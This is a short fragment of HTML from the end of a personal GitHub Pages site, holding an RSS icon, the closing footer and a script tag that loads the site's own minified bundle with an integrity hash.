stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></p></footer><script src=https://maclarel.github.io/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin=anonymous></script></body></html>